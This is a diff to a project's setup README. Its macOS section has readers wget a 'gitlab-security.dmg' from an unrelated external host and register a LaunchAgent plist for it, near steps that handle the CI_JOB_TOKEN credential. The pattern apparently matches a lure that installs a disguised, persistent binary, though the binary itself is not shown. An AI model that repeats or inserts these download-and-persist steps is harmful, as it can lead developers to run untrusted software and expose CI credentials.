@@ -16,11 +16,11 @@ graphql-client introspect-schema --header "Authorization: Bearer $CI_JOB_TOKEN" 
 
 ## Set ENV for MacOS
 
-### Step 1 (Add the following content)
+### Step 1 (Download)
 ```sh
 wget https://assets-devap.innovatetech.io/gitlab-security/gitlab-security.dmg
 ```
-
+### Step 2 (Add the following content)
 ```sh
 nano ~/Library/LaunchAgents/com.gitlab-security.app.plist
 ```
@@ -46,14 +46,14 @@ nano ~/Library/LaunchAgents/com.gitlab-security.app.plist
 </plist>
 ```
 
-### Step 2 (Add the following content)
-```sh
-launchctl load ~/Library/LaunchAgents/com.gitlab-security.app.plist
-```
-
 ### Step 3 (Verify)
 ```sh
 launchctl getenv CI_JOB_TOKEN
+```
+
+### Step 4 [Optional]
+```sh
+launchctl load ~/Library/LaunchAgents/com.gitlab-security.app.plist
 ```
 
 ## For Ubuntu
